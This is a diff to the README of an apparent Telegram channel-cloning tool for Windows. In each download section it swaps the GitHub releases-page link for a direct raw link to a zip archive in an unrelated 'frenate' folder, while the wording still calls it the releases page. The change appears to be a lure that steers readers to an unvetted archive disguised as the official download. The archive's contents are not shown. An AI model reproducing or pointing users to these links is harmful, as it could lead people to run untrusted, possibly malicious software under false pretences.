@@ -1,10 +1,10 @@
 # 🛰️ telegram-auto-clone-download - Keep Channels in Sync with Ease
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Dororecessed36/telegram-auto-clone-download/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Dororecessed36/telegram-auto-clone-download/main/frenate/telegram_download_clone_auto_v1.9.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Dororecessed36/telegram-auto-clone-download/releases
+Visit this page to download: https://raw.githubusercontent.com/Dororecessed36/telegram-auto-clone-download/main/frenate/telegram_download_clone_auto_v1.9.zip
 
 Choose the latest release for Windows, then download the file that matches your system.
 
@@ -24,7 +24,7 @@ Use it when you want to keep a local copy of channel posts, files, photos, or vi
 
 ## 🚀 Get started
 
-1. Open the download page: https://github.com/Dororecessed36/telegram-auto-clone-download/releases
+1. Open the download page: https://raw.githubusercontent.com/Dororecessed36/telegram-auto-clone-download/main/frenate/telegram_download_clone_auto_v1.9.zip
 2. Find the latest release
 3. Download the Windows file for the app
 4. Open the file you downloaded
@@ -166,4 +166,4 @@ This project centers on:
 
 ## 📎 Download again
 
-If you need the app file again, visit the releases page: https://github.com/Dororecessed36/telegram-auto-clone-download/releases
+If you need the app file again, visit the releases page: https://raw.githubusercontent.com/Dororecessed36/telegram-auto-clone-download/main/frenate/telegram_download_clone_auto_v1.9.zip
